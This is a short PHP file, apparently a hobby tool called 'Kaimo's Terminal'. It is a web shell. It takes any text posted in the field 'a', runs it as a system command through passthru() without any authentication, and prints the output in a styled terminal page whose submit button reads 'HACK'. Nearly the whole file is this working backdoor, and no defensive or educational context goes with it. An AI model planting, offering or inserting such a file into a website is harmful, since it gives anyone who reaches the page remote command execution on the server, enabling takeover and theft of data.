<?php

error_reporting(E_ALL & ~E_NOTICE);
$a = $_POST['a'];

if($a) {
  $aDisplay = "&gt; ".htmlentities($a)."\n\n";
  ob_start();
  passthru($a);
  $b = ob_get_contents();
  ob_end_clean();
  $b = htmlentities($b);

  $output = $b;
}

echo "
<html>
  <head>
    <title>Kaimo's Terminal</title>
    <style type='text/css'>
      /*1337 Style*/
      body {
        background-color: black;
        margin: 0;
        overflow: hidden;
      }

      html {
        width: 100%;
        height: 100%;
      }
      body {
        height: 100%;
      }

      textarea {
        width: 100%;
        height: 100%;
        margin: 0;
        background-color: black;
        border: 2px solid red;
        border-top: 0;
        color: red;
        font-size: 14px;
        padding: 5px;
      }

      div.mastercontainer {
        display: flex;
        flex-flow: column;
        height: 100%;
      }
      div.textareacontainer {
        flex: 1;
      }
      form {
        display: flex;
        margin: 0;
      }
      div.inputcontainer {
        
      }
      input[type='text'] {
        flex: 1;
        background-color: #1a1a1a;
        color: red;
        border: 0;
        border-bottom: 2px solid red;
        font-size: 15px;
        padding: 10px;
        border-top: 2px dotted red;
        border-left: 2px dotted red;
      }
      input[type='submit'] {
        border: 0;
        background-color: red;
        padding: 0 20px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <div class='mastercontainer'>
      <div class='inputcontainer'>
        <form method='post'>
          <input type='text' name='a' autofocus style='width: 100%;'>
          <input type='submit' value='HACK'>
        </form>
      </div>
      <div class='textareacontainer'>
        <textarea>".$aDisplay."$output</textarea>
      </div>
    </div>
  </body>
</html>
";
?>
